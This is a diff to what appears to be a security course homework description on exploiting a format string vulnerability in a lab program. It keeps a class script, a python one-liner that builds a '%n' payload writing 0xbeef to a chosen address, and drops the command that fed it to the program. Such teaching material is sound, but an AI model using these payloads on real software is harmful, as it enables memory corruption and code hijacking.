@@ -8,7 +8,7 @@ In this project, you will leverage a format string vulnerability in the program 
 
 Below is the script we used in class that successfull writes "0xbeef".
 
-> ./fmt_vuln `python -c 'print("\x30\xa0\x04\x08"+"JUNK" + "\x31\xa0\x04\x08" + "%08x."*9+"%146x%n" + "%207x%n")'`
+> python -c 'print("\x30\xa0\x04\x08"+"JUNK" + "\x31\xa0\x04\x08" + "%08x."*9+"%146x%n" + "%207x%n")'
 
 This homework accounts for **5 points**.
 
